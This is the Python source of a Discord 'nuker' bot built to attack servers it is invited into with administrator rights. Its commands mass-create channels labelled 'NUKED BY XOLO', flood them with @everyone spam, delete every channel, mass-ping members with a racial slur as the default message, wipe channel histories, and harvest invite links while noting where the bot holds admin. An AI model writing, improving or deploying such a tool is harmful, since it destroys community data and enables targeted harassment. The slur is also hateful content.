import discord
import asyncio
from discord.ext import commands

# Replace TOKEN with your Discord bot token
TOKEN = 'URTOKEN'
YOURUSERID = 'URUSERID'

intents = discord.Intents.default()
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    user = await bot.fetch_user(YOURUSERID)
    await user.send("Bot ready. Developed by <@992952207588720730>")
    print(f'Logged in as {bot.user.name}')


@bot.command()
async def flush(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            created_channels = []
            channel_name = "NUKED BY XOLO"
            message_content = "@everyone FLOP"
            channel_amount = 50
            message_amount = 50

            for _ in range(channel_amount):
                new_channel_name = channel_name.strip()
                existing_channel = discord.utils.get(guild.channels, name=new_channel_name)
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                print(f'Created channel: {new_channel.name}')
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                task = asyncio.create_task(send_messages(channel, message_amount, message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)

            await ctx.send("Operation complete.")
        else:
            await ctx.send(f'Could not find the server with ID "{server_id}"')
    except ValueError:
        await ctx.send("Invalid syntax")



@bot.command()
async def customflush(ctx, server_id, channel_amount, channel_name, message_amount, *, message_content):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            created_channels = []
            for _ in range(int(channel_amount)):
                new_channel_name = channel_name.strip()
                existing_channel = discord.utils.get(guild.channels, name=new_channel_name)
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                new_channel = await guild.create_text_channel(new_channel_name, overwrites=overwrites)
                print(f'Created channel: {new_channel.name}')
                created_channels.append(new_channel)

            tasks = []
            for channel in created_channels:
                task = asyncio.create_task(send_messages(channel, int(message_amount), message_content))
                tasks.append(task)

            await asyncio.gather(*tasks)

            await ctx.send("Operation complete.")
        else:
            await ctx.send(f'Could not find the server with ID "{server_id}"')
    except ValueError:
        await ctx.send("Invalid syntax.")
        
@bot.command()
async def purge(ctx, server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild is not None:
            for channel in guild.channels:
                await channel.delete()
            await ctx.send("All channels have been deleted.")
        else:
            await ctx.send(f'Could not find the server with ID "{server_id}"')
    except ValueError:
        await ctx.send("Invalid input. Please try again.")

@bot.command()
async def helpme(ctx):
    message = '''

**Flush**
Nukes server
!flush <serverid>

**Custom Flush**
Creates channels and messages
!customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>
E.g.
!customflush 1234567890 5 TestOmg 10 TestOmg

**Purge**
Deletes all channels
!purge <serverid>

**Leave**
Leaves the server
!leave <serverid>

**Link**
Invite link
!link

**Server list**
!servlist

**Mass Ping**
!massping <serverid> <messageamount> <messagecontent>

**Clear**
Deletes all messages sent by the bot.
!clear <serverid>

**Clear Channel**
Deletes all messages in a channel.
!clearchannel <serverid> <channelid>
'''
    await ctx.send(message)


@bot.command()
async def leave(ctx, server_id):
    guild = bot.get_guild(int(server_id))
    if guild is not None:
        guildname = guild.name
        await guild.leave()
        await ctx.send(f"Successfully left the server **{guildname}**.")
    else:
        await ctx.send(f"Could not find the server with ID {server_id}.")

@bot.command()
async def link(ctx):
    await ctx.send("https://discord.com/api/oauth2/authorize?client_id=999232775443984495&permissions=8&scope=bot")


@bot.command()
async def servlist(ctx):
    servers = bot.guilds
    server_list = ""
    for server in servers:
        text_channels = server.text_channels
        if text_channels:
            invite = await text_channels[0].create_invite()
            permissions = server.me.guild_permissions
            if permissions.administrator:
                permission_string = "Yes"
            else:
                permission_string = "No"
            server_info = f"**{server.name}** (ID: {server.id})\nInvite: {invite.url}\nHas Admin: {permission_string}\n============================\n"
            server_list += server_info
    await ctx.send(f"Server list:\n{server_list}")

@bot.command()
async def massping(ctx, server_id: int, message_amount: int = 5, *, message_content: str = "Sup niggas"):
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    members = guild.members[:50]  # Fetch up to 50 members
    mentions = ' '.join(member.mention for member in members)

    tasks = []
    for channel in guild.text_channels:
        for _ in range(message_amount):
            tasks.append(channel.send(f"{mentions} {message_content}"))

    await asyncio.gather(*tasks)
    await ctx.send("Operation complete.")

@bot.command()
async def clear(ctx, server_id: int):
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return

    def is_bot_message(message):
        return message.author == bot.user

    deleted_count = 0
    for channel in guild.text_channels:
        async for message in channel.history(limit=None):
            if is_bot_message(message):
                await message.delete()
                deleted_count += 1

    await ctx.send(f"Deleted {deleted_count} message(s) sent by the bot.")


@bot.command()
async def clearchannel(ctx, server_id: int, channel_id: int):
    try:
        guild = bot.get_guild(server_id)
        channel = guild.get_channel(channel_id)

        if not channel:
            await ctx.send(f"Channel with ID {channel_id} not found.")
            return

        await channel.purge()
        await ctx.send(f"All messages in channel {channel.name} have been deleted.")
    except discord.errors.Forbidden:
        await ctx.send("Lacking permissions.")



async def send_messages(channel, num_messages, message_content):
    for _ in range(num_messages):
        await channel.send(message_content)


bot.run(TOKEN)
